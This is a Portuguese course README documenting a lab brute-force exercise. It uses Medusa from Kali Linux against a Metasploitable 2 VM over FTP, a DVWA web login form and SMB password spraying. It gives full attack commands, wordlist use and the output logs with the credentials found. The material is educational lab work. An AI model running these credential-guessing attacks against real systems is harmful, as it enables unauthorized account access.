# DIO-Cibersecurity
Curso de Cibersegurança da DIO com parceria com o santander

Este README irá documentar a simulação de ataque de força bruta utilizando o Kali Linus e a ferramenta medusa, como alvo o Sistema METASPLOITABLE 2 (chamado de META).

- Preparação do ambiênte
Instalação do ambiênte Kali no Virtual box, bem como do METASPLOITABLE.
Utilizar a placa de rede como (Placa de rede exclusiva de hospedeiro), para os sistemas se enxergarem.

- Para começar foi necessário fazer a verificação de qual o IP do META.
- Após a descoberta inicei os preparativos no KALI.
- Fiz inicialmente o ping para confirmar o alvo utilizando `ping -c 3 192.168.56.103`


- Iniciando o ataque simulado de FTP com a ferramenta Medusa.
  Ao iniciar o ataque com a ferramenta medusa foi utilizado o seguinte comando para testar as senhas previamente configuradas.
  - Senhas foram obtidas por meio de previo estudo de senhas passadas pela instrutora.
  Iniciando o ataque com o comando - `medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6`
como resultado obtive a seguinte resposta.

```Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-27 22:58:25 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (1 of 3, 1 complete) Password: msfadmin (1 of 4 complete)

**2025-11-27 22:58:25 ACCOUNT FOUND: [ftp] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS]**

2025-11-27 22:58:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (2 of 3, 2 complete) Password: 123456 (1 of 4 complete)

2025-11-27 22:58:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (2 of 3, 2 complete) Password: password (2 of 4 complete)

2025-11-27 22:58:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (2 of 3, 3 complete) Password: querty (3 of 4 complete)

2025-11-27 22:58:29 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (1 of 3, 3 complete) Password: querty (2 of 4 complete)

2025-11-27 22:58:29 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (1 of 3, 3 complete) Password: 123456 (3 of 4 complete)

2025-11-27 22:58:29 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (1 of 3, 3 complete) Password: password (4 of 4 complete)

2025-11-27 22:58:31 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (2 of 3, 4 complete) Password: msfadmin (4 of 4 complete)

2025-11-27 22:58:31 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (3 of 3, 4 complete) Password: 123456 (1 of 4 complete)

2025-11-27 22:58:31 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (3 of 3, 4 complete) Password: password (2 of 4 complete)

2025-11-27 22:58:32 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (3 of 3, 4 complete) Password: querty (3 of 4 complete)

2025-11-27 22:58:33 ACCOUNT CHECK: [ftp] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (3 of 3, 4 complete) Password: msfadmin (4 of 4 complete)
```

Deixei marcado a senha que foi obtida.
Agora só abrir o sistema FTP da máquina testada para verificar.

```ftp 192.168.56.103

Connected to 192.168.56.103.

220 (vsFTPd 2.3.4)

**Name (192.168.56.103:keven): msfadmin**

331 Please specify the password.

Password: 

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp>
```

**- Ataque automatizado em formulário Web DVWA**
- Para iniciar o ataque acessamos o formulário a ser testado.
- Após o teste inicial e levantamento de falhas do própio formulário foi identificado que para fazer o login, as crdenciais atuais são transmitidas sem criptografia.
- Podemos utilizar esse conhecimento para poder verificar se o teste foi bem sucedido.

  Após isso criamos uma lista de possíveis senhas. Para fins didáticos utilizarrei as mesmas do exemplo anterior.

  Com a Ferramenta medusa inicio o ataque com o comando
  ```
  medusa -h 192.168.56.103 -U users.txt -P pass.txt -M http \
  -m PAGE: '/dvwa/login.php' \
  -m FORM: 'username="USER"&password="PASS"&login=Login' \
  -m 'FAIL=Login failed' -t 6
  ``` 
Como resultado do comando encontrei a senha e obtive acesso.

```
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-27 23:55:54 ACCOUNT CHECK: [http] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (1 of 3, 1 complete) Password: password (1 of 4 complete)

2025-11-27 23:55:54 ACCOUNT FOUND: [http] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS]

2025-11-27 23:55:54 ACCOUNT CHECK: [http] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (1 of 3, 2 complete) Password: 123456 (2 of 4 complete)

2025-11-27 23:55:54 ACCOUNT FOUND: [http] Host: 192.168.56.103 User: msfadmin Password: 123456 [SUCCESS]

2025-11-27 23:55:54 ACCOUNT CHECK: [http] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (2 of 3, 3 complete) Password: querty (1 of 4 complete)

2025-11-27 23:55:54 ACCOUNT FOUND: [http] Host: 192.168.56.103 User: admin Password: querty [SUCCESS]

2025-11-27 23:55:54 ACCOUNT CHECK: [http] Host: 192.168.56.103 (1 of 1, 0 complete) User: root (3 of 3, 4 complete) Password: 123456 (1 of 4 complete)

2025-11-27 23:55:54 ACCOUNT FOUND: [http] Host: 192.168.56.103 User: root Password: 123456 [SUCCESS]

2025-11-27 23:55:54 ACCOUNT CHECK: [http] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (1 of 3, 5 complete) Password: querty (3 of 4 complete)

2025-11-27 23:55:54 ACCOUNT FOUND: [http] Host: 192.168.56.103 User: msfadmin Password: querty [SUCCESS]

2025-11-27 23:55:54 ACCOUNT CHECK: [http] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (2 of 3, 6 complete) Password: msfadmin (2 of 4 complete)

2025-11-27 23:55:54 ACCOUNT FOUND: [http] Host: 192.168.56.103 User: admin Password: msfadmin [SUCCESS]

2025-11-27 23:55:54 ACCOUNT CHECK: [http] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (2 of 3, 7 complete) Password: password (3 of 4 complete)

2025-11-27 23:55:54 ACCOUNT FOUND: [http] Host: 192.168.56.103 User: admin Password: password [SUCCESS]

2025-11-27 23:55:54 ACCOUNT CHECK: [http] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (2 of 3, 8 complete) Password: 123456 (4 of 4 complete)

2025-11-27 23:55:54 ACCOUNT FOUND: [http] Host: 192.168.56.103 User: admin Password: 123456 [SUCCESS]

2025-11-27 23:55:54 ACCOUNT CHECK: [http] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (1 of 3, 9 complete) Password: password (4 of 4 complete)

2025-11-27 23:55:54 ACCOUNT FOUND: [http] Host: 192.168.56.103 User: msfadmin Password: password [SUCCESS]
```

Notem que após a senha ser encontrada todas as tentaivas posteriores são dadas como corretas.


- Para utimo teste, utilizamos a Medusa para password Sprayng com SMB.
- Para isso utilizaremos o mesmo ambiênte.

  Começaremos com o levantamento de senhas, utilizarei a mesma lista dos testes anteriores.

  `medusa -h 192.168.56.103 -U users.txt -P pass.txt -M smbnt -t 2 -T 50`

  Como resultado tive a seguinte saída.
  ```
  Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: 123456 (1 of 4 complete)

2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: password (2 of 4 complete)

2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: querty (3 of 4 complete)

2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (4 of 4 complete)

2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (1 of 4 complete)

2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (2 of 4 complete)

2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: querty (3 of 4 complete)

2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (4 of 4 complete)

2025-11-28 00:25:18 ACCOUNT FOUND: [smbnt] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]

2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 123456 (1 of 4 complete)

2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: password (2 of 4 complete)

2025-11-28 00:25:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.103 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: querty (3 of 4 complete)
```
